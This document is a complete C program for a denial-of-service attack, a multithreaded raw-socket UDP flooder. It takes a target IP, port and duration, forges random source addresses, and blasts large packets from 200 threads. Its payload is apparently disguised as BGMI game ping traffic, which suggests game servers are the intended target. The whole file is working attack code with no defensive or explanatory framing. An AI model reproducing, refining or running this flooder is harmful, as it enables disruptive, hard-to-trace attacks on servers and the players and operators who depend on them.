#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <pthread.h>

#define PACKET_SIZE 4096
#define MAX_PACKETS_PER_SEC 100000
#define NUM_THREADS 200

struct flood_args {
    const char *target_ip;
    int target_port;
    int duration;
    unsigned long *packets_sent;
    pthread_mutex_t *mutex;
};

struct pseudo_header {
    uint32_t source_addr;
    uint32_t dest_addr;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void *thread_flood(void *arg) {
    struct flood_args *args = (struct flood_args *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Raw socket creation failed");
        pthread_exit(NULL);
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    srand(time(NULL) + (unsigned int)pthread_self());
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    char packet[PACKET_SIZE + sizeof(struct iphdr) + sizeof(struct udphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PACKET_SIZE);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;

    udph->dest = target.sin_port;
    udph->len = htons(sizeof(struct udphdr) + PACKET_SIZE);
    udph->check = 0;

    const char header[] = {0xFF, 0xFF, 0xFF, 0xFF};
    snprintf(data, PACKET_SIZE, "%.*sBGMI:Player%d:Ping:%d", 
             4, header, rand() % 1000, rand() % 1000);
    memset(data + strlen(data), 'X', PACKET_SIZE - strlen(data) - 1);
    data[PACKET_SIZE - 1] = '\0';

    time_t start_time = time(NULL);

    while (time(NULL) - start_time < args->duration) {
        for (int i = 0; i < MAX_PACKETS_PER_SEC / NUM_THREADS; i++) {
            iph->id = htonl(rand() % 65535);
            iph->saddr = htonl(rand()); // Random source IP
            udph->source = htons(rand() % 65535);

            iph->check = 0;
            struct pseudo_header psh = {
                .source_addr = iph->saddr,
                .dest_addr = iph->daddr = target.sin_addr.s_addr,
                .placeholder = 0,
                .protocol = IPPROTO_UDP,
                .udp_length = udph->len
            };
            char check_buf[sizeof(struct pseudo_header) + sizeof(struct udphdr) + PACKET_SIZE];
            memcpy(check_buf, &psh, sizeof(psh));
            memcpy(check_buf + sizeof(psh), udph, sizeof(struct udphdr));
            memcpy(check_buf + sizeof(psh) + sizeof(struct udphdr), data, PACKET_SIZE);
            udph->check = checksum(check_buf, sizeof(check_buf));
            iph->check = checksum(iph, sizeof(struct iphdr));

            ssize_t sent = sendto(sock, packet, ntohs(iph->tot_len), 0,
                                 (struct sockaddr *)&target, sizeof(target));
            if (sent > 0) {
                pthread_mutex_lock(args->mutex);
                (*args->packets_sent)++;
                pthread_mutex_unlock(args->mutex);
            }
        }
        usleep(5); // Minimal sleep for instant impact
    }

    close(sock);
    pthread_exit(NULL);
}

int udp_flood(const char *target_ip, int target_port, int duration) {
    pthread_t threads[NUM_THREADS];
    struct flood_args args;
    unsigned long packets_sent = 0;
    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

    args.target_ip = target_ip;
    args.target_port = target_port;
    args.duration = duration;
    args.packets_sent = &packets_sent;
    args.mutex = &mutex;

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, thread_flood, &args) != 0) {
            perror("Thread creation failed");
            return -1;
        }
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sleep(1);
        pthread_mutex_lock(&mutex);
        printf("\rPackets sent: %lu (%.1f packets/sec, %.1f Mbps)", 
               packets_sent, (float)packets_sent / (time(NULL) - start_time),
               (float)packets_sent * PACKET_SIZE * 8 / (time(NULL) - start_time) / 1000000);
        fflush(stdout);
        pthread_mutex_unlock(&mutex);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_mutex_destroy(&mutex);
    printf("\nFlood completed. Total packets sent: %lu\n", packets_sent);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    srand(time(NULL));
    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Port must be between 1 and 65535\n");
        return EXIT_FAILURE;
    }
    if (duration <= 0) {
        fprintf(stderr, "Duration must be positive\n");
        return EXIT_FAILURE;
    }
    
    int ignore_ports[] = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030};
    int num_ignore_ports = sizeof(ignore_ports) / sizeof(ignore_ports[0]);
    int should_ignore = 0;
    for (int i = 0; i < num_ignore_ports; i++) {
        if (target_port == ignore_ports[i]) {
            should_ignore = 1;
            break;
        }
    }
    if (should_ignore) {
        fprintf(stderr, "Error: Port %d is in the ignore list\n", target_port);
        return EXIT_FAILURE;
    }
    
    printf("Starting raw UDP flood on %s:%d for %d seconds with %d threads\n", 
           target_ip, target_port, duration, NUM_THREADS);
    
    if (udp_flood(target_ip, target_port, duration) < 0) {
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}